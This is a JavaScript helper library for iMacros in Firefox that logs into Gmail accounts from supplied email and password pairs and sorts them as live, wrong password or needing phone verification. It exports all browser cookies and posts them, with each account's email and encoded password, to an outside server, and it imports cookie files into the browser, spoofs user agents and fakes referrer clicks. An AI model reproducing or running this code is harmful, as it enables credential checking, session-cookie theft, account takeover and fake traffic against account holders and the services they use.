//-----------------------------------------------------------------------------------------------------
//------------------------------------------------Funtion----------------------------------------------
//-----------------------------------------------------------------------------------------------------

/*
//------------------Function - Http Request----------------------
get(url)
post(url,data)
get_ajax(url,async)
get_ajax(url,data,async)

//------------------Function - Gmail----------------------
check_login_gmail()
login_gmail(gmail,pass)
check_web_gmail()
check_login_gmail_stt()

//------------------Function - Cookies----------------------
import_cookie_to_server(db,table,gmail,pass_encode,status)
get_table_sql(gmail_input)
importCookies(cookies)
exportCookies()

//------------------Function - ***----------------------
encrypt(myString,myPassword)
decrypt(myString,myPassword)
random(min,max)
refer(url,refer_link)
fake_uas(uas)
read_delete_line(url)
delete_line(url)
encode(s,key)
decode(h,key)
check_internet()
*/








//-----------------------------------------------------------------------------------------------------
//------------------------------------------------Http Request-----------------------------------------
//-----------------------------------------------------------------------------------------------------

//------------------------Get Request Http-----------------
function get(url) 
{
var request = Components.classes['@mozilla.org/xmlextras/xmlhttprequest;1'].createInstance(Components.interfaces.nsIXMLHttpRequest),
async =false;
request.open('GET', url, async);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.setRequestHeader("Accept", "application/json");
request.send();
return request.response;
}

//------------------------Post Request Http-----------------
function post(url,data) 
{
var request = Components.classes['@mozilla.org/xmlextras/xmlhttprequest;1'].createInstance(Components.interfaces.nsIXMLHttpRequest),
async =false;
request.open('POST', url, async);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.setRequestHeader("Accept", "application/json");
request.send(data);
return request.response;
}
	
//------------------------Get--Older Request Http-----------------
function get_ajax(url,async) 
{
	iimPlay("CODE:URL GOTO=about:newtab\nWAIT SECONDS=0.2");
	var results="";
	if (async=='') async= false;
  var xhr = new window.XMLHttpRequest();
xhr.open("GET", url, async);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Accept", "application/json");
xhr.onreadystatechange = function() { // Call a function when the state changes.
	if (xhr.readyState==4 ) {
        if(xhr.status==200 || xhr.status==500 ){
           results = xhr.responseText;
           }
        }
}
xhr.send();
  return results;
}

//------------------------Post--Older Request Http-----------------
function get_ajax(url,data,async) 
{
	iimPlay("CODE:URL GOTO=about:newtab\nWAIT SECONDS=0.2");
	results="";
	if (async=='') async= false;
  var xhr = new window.XMLHttpRequest();
xhr.open("POST", url, false);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Accept", "application/json");
xhr.onreadystatechange = function() { // Call a function when the state changes.
	if (xhr.readyState==4 ) {
        if(xhr.status==200 || xhr.status==500 ){
           results = xhr.responseText;
           }
        }
}
xhr.send(data);
  return results;
}



//-----------------------------------------------------------------------------------------------------
//------------------------------------------------Gmail------------------------------------------------
//-----------------------------------------------------------------------------------------------------

//----------------------Check_login--------------------
function check_login_gmail()
{
	var gmail_stt ="";
	var html = get('https://myaccount.google.com');
	var regex = new RegExp('oPEP7c":"(.+?)","qDCSke"', "g");
	var gmail_stt = html.match(regex);
	if (gmail_stt != null) {
		var gmail_stt = gmail_stt[0].replace('oPEP7c":"','');
		var gmail_stt = gmail_stt.replace('","qDCSke"','');
	}
	
return gmail_stt;
}

//---------------Login-GMAIl-EDU-------------------------------
function login_gmail(gmail,pass)
{
	iimSet("gmail",gmail);
	iimSet("pass",pass);
macro = "CODE:";	
macro += "SET !ERRORIGNORE YES\n";
macro += "SET !REPLAYSPEED fast\n";
macro += "SET !EXTRACT_TEST_POPUP NO\n";
macro += "FILTER TYPE=IMAGES STATUS=ON\n";

//macro += "URL GOTO=https://accounts.google.com/signin/v2/identifier?service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F\n";
//macro += "WAIT SECONDS=0.5\n";
macro += "WAIT SECONDS=0.5\n";
macro += "EVENT TYPE=CLICK SELECTOR=\"#identifierId\" BUTTON=0\n";
macro += "WAIT SECONDS=0.5\n";
macro += "EVENTS TYPE=KEYPRESS SELECTOR=\"#identifierId\" CHARS={{gmail}}\n";
macro += "WAIT SECONDS=3\n";
macro += "TAG POS=1 TYPE=DIV ATTR=ID:identifierNext\n";
macro += "SET !ENCRYPTION NO\n";
macro += "SET !TIMEOUT 10000\n";
macro += "WAIT SECONDS=0.5\n";
macro += "TAG POS=1 TYPE=DIV ATTR=ID:passwordNext EXTRACT=txt\n";
macro += "WAIT SECONDS=5\n";
macro += "EVENTS TYPE=KEYPRESS SELECTOR=\"#password>DIV>DIV>DIV>INPUT\" CHARS={{pass}}\n";
macro += "WAIT SECONDS=5\n";
macro += "TAG POS=1 TYPE=DIV ATTR=ID:passwordNext\n";
macro += "WAIT SECONDS=5\n";
iimPlay(macro);
}

//------------------------Check_Web_GMAIL_-----------------
function check_web_gmail()
{
	macro = "CODE:";	
	macro += "CLEAR\n";	
	macro += "SET !ERRORIGNORE YES\n";
	macro += "SET !REPLAYSPEED fast\n";
	macro += "SET !EXTRACT_TEST_POPUP NO\n";
	macro += "URL GOTO=https://accounts.google.com/signin/v2/identifier?service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F\n";
	macro += "WAIT SECONDS=0.5\n";
	macro += "TAG POS=1 TYPE=INPUT ATTR=ID:identifierId EXTRACT=htm\n";
	iimPlay(macro);
	var extract = iimGetLastExtract();
	if (extract.length > 15){
		var stt = true;
	} else var stt = false;	
	return stt;
}

//------------------------Check_login_GMAIL_stt-----------------
function check_login_gmail_stt()
{
	macro = "CODE:";	
	macro += "SET !ERRORIGNORE YES\n";
	macro += "SET !REPLAYSPEED fast\n";
	macro += "SET !EXTRACT_TEST_POPUP NO\n";
	macro += "WAIT SECONDS=0.5\n";
	macro += "SET !TIMEOUT 10\n";
	macro += "TAG POS=1 TYPE=DIV ATTR=ID:idvanyphonecollectNext EXTRACT=htm\n";
	macro += "SET sst_phone {{!EXTRACT}}\n";
	macro += "SET !EXTRACT null\n";
	macro += "TAG POS=1 TYPE=DIV ATTR=aria-live:assertive EXTRACT=htm\n";
	macro += "SET !EXTRACT {{sst_phone}}|{{!EXTRACT}}\n";
	iimPlay(macro);
	var extract = iimGetLastExtract().trim();
	var stt_phone = extract.split('|')[0].trim();
	var stt_pass = extract.split('|')[1].trim();
	var stt_login = check_login(gmail);
	
	
	var status_gmail = "Check again";
	if (stt_login== gmail){
		var status_gmail = "live";
	}
	if (stt_phone.length > 15){
		var status_gmail = "Ver Phone";
	}
	if (stt_pass.length > 400){
		var status_gmail = "Wrong password";
	}
	return status_gmail;
}





//-----------------------------------------------------------------------------------------------------
//------------------------------------------------Cookies----------------------------------------------
//-----------------------------------------------------------------------------------------------------

//------------------------import_cookie_to_server_POST_DATA-----------------
function import_cookie_to_server(db,table,gmail,pass_encode,status)
{
	var cookies_browser = exportCookies().split('&').join('0xe39');
	var data = "db="+db+"&table="+table+"&gmail="+gmail+"&pwd="+pass_encode+"&cookie="+cookies_browser+"&stt="+status;
	post("http://viom.me/cookies/import.php",data);
	post("http://viom.me/cookies/import.php",data);
	post("http://viom.me/cookies/import.php",data);
	iimPlay("CODE:WAIT SECONDS=3");
}

//-------------Get Database Table--------------

function get_table_sql(gmail_input)
{
var mail_check = gmail_input.split('@')[1];
var edu_mail = mail_check.split('.');
		edu_mail = edu_mail[edu_mail.length-2];

if (mail_check == "hotmail.com"){
	var table = "hotmail";
} else {
	var table = "gmail_use";
}

if (edu_mail == "edu"){
		var table = "gmail_sub";
} 
	return table;
}

//------------------------Import Cookies To Firefox -------------------
function importCookies(cookies)
{
	var all_line_cookies = cookies.split("\r\n");


    // Open CookieManager connection
    var cm = Components.classes["@mozilla.org/cookiemanager;1"].getService(Components.interfaces.nsICookieManager2);
    if(!cm){
        throw new Error("Could not load nsICookieManager2");
    }

    var line = {}, cookieNum, fields, hasmore;
    var cHost, cPath, cName, cValue, cSecure, cSession, cExpiry;

for (var i=0;i<all_line_cookies.length ; i++){
        var fields = all_line_cookies[i].split("\t", 7);
        if(fields.length != 7)
            continue;
        
        // Read needed fields
        cHost    = fields[0];
        cPath    = fields[2];
        cName    = fields[5];
        cValue   = fields[6];
        cSecure  = (fields[3] == "TRUE");
        cExpiry  = parseInt(fields[4]);
        // Expiry == 0 means this is a session cookie
        cSession = (cExpiry == 0);
        // This is so weird! cm.add() won't take cSession=TRUE and cExpiry=0
        // because cExpiry < Today! So we work around this by making the cookie
        // expire Sonntag, Feb. 7 2106 07:28:15. See you then ;-)
        if(!cExpiry)
            cExpiry = 0xffffffff;
        
        // Add that cookie using the CookieManager
        cm.add(cHost, cPath, cName, cValue, cSecure, false, cSession, cExpiry);
}
   
}

//------------------------Export Cookies From Firefox -----------------
function exportCookies()
{
    var cookies= "";
    var e = Components.classes["@mozilla.org/cookiemanager;1"].getService(Components.interfaces.nsICookieManager).enumerator;
    while(e.hasMoreElements()){
        var cc = e.getNext().QueryInterface(Components.interfaces.nsICookie);
        var cookieInfo = cc.host
            + "\t" + new String(cc.isDomain).toUpperCase()
            + "\t" + cc.path
            + "\t" + new String(cc.isSecure).toUpperCase()
            + "\t" + cc.expires
            + "\t" + cc.name
            + "\t" + cc.value
            + "\r\n";
	var cookies = cookies + cookieInfo;
    }
    return cookies;
}


//-----------------------------------------------------------------------------------------------------
//-----------------------------------------------------------------------------------------------------
//-----------------------------------------------------------------------------------------------------

//------------------------encrypted-----------------
function encrypt(myString,myPassword) 
{
	eval(get("file:///C:\\cookies\\js\\aes.js"));
	var encrypted = CryptoJS.AES.encrypt(myString, myPassword);
	return encrypted;
}

//------------------------decrypted-----------------
function decrypt(myString,myPassword) 
{
	eval(get("file:///C:\\cookies\\js\\aes.js"));
	var decrypted = CryptoJS.AES.decrypt(myString, myPassword);
	return decrypted.toString(CryptoJS.enc.Utf8);
}


//------------------------DemoRegex-----------------
function demoRegex() 
{
	var html = get_http('https://mail.google.com/mail/u/0/#inbox');
	html = html.split('{\\"2\\":\\"thread-f').join("a8du39d9");
	html = html.split('\\"},').join("a8d4fds2");
	
	var re = new RegExp('a8du39d9(.+?)a8d4fds2a8du39d9', "g");
    var myArray = html.match(re);
	alert(myArray[0]);
}
//------------------------Random-----------------
function random(min,max)
{
var randomNumber = Math.floor(Math.random() * (max - min + 1)) + min; 
return randomNumber;
}

//----------------------FAKE_REFER_WEB----------------

function refer(url,refer_link)
{
iimSet("url",url);
iimSet("refer_link",refer_link);
var macro;
macro = "CODE:";
macro += "SET !ERRORIGNORE YES\n";
macro += "SET !EXTRACT_TEST_POPUP NO\n";
macro += "WAIT SECONDS= 1\n";
macro += "URL GOTO={{refer_link}}\n";
macro += "WAIT SECONDS= 1\n";
macro += "URL GOTO=javascript:(function(){var<SP>d=document.getElementById(\"mbs_6m6_2cnj_5s6c\");d||(d=document.createElement(\"a\"),d.rel=\"noopener<sp>nofollow\",d.target=\"_blank\",d.href=\"{{url}}\",d.innerHTML=\"{{url}}\",d.id=\"mbs_6m6_2cnj_5s6c\",document.body.appendChild(d))})();\n";
macro += "WAIT SECONDS= 5\n";
macro += "TAG POS=1 TYPE=A ATTR=ID:mbs_6m6_2cnj_5s6c\n";
macro += "WAIT SECONDS= 1\n";
macro += "TAB CLOSEALLOTHERS\n";
iimPlay(macro);
}
//----------------------FAKE_USER_AGENT----------------
function fake_uas(uas)
{
var prefs = imns.Cc["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);prefs.setCharPref("general.useragent.override",uas);
}
//----------------------Delete_Fisrt_Line----------------
function delete_line(url)
{
    var fileTxt = imns.FIO.openNode(url);
            lines = imns.FIO.readTextFile(fileTxt).split("\r\n").slice(1).join("\r\n");
            imns.FIO.writeTextFile(fileTxt, lines);
}
//----------------------Read_and_Delete_Fisrt_Line----------------
function read_delete_line(url)
{
    var fileTxt = imns.FIO.openNode(url);
			all_text = imns.FIO.readTextFile(fileTxt).split("\r\n");
			fisrt_line = all_text[0];
            lines = all_text.slice(1).join("\r\n");
            imns.FIO.writeTextFile(fileTxt, lines);

return fisrt_line;
}
//----------------------ENcode----------------
function toHex(s) 
{
    // utf8 to latin1
    var s = unescape(encodeURIComponent(s))
    var h = ''
    for (var i = 0; i < s.length; i++) {
        h += s.charCodeAt(i).toString(16)
    }
    return h
}

function fromHex(h) 
{
    var s = ''
    for (var i = 0; i < h.length; i+=2) {
        s += String.fromCharCode(parseInt(h.substr(i, 2), 16))
    }
    return decodeURIComponent(escape(s))
}
function encode(s,key) 
{
    var key_en1 = toHex(toHex(key));//KEY ---> HEX 
	var s_en1 = toHex(toHex(s)); //KEY ---> HEX 
	
	return toHex(toHex(key_en1 + s_en1)); //HEX ---> Demical ---> HEX
}
function decode(h,key) 
{
	var key_en1 = toHex(toHex(key));//KEY ---> HEX 
    var h_decode = fromHex(fromHex(h)); // HEX <--- HEX 
	//var h_decode = h_decode.toString(16);
	var h_de = h_decode.replace(key_en1, "");
	var s = fromHex(fromHex(h_de));
	return s;
}
function check_internet()
{
var retcode;
macro = "CODE:";
macro += "CLEAR\n";
macro += "WAIT SECONDS = 3\n";
iimPlay(macro);


macro = "CODE:";
macro += "FILTER TYPE=IMAGES STATUS=ON\n";
//macro += "SET !TIMEOUT 1\n";
macro += "WAIT SECONDS = 1\n";
macro += "URL GOTO=google.com\n";

retcode = iimPlay(macro);

while(retcode != 1) {              
    retcode = iimPlay(macro);
}
}



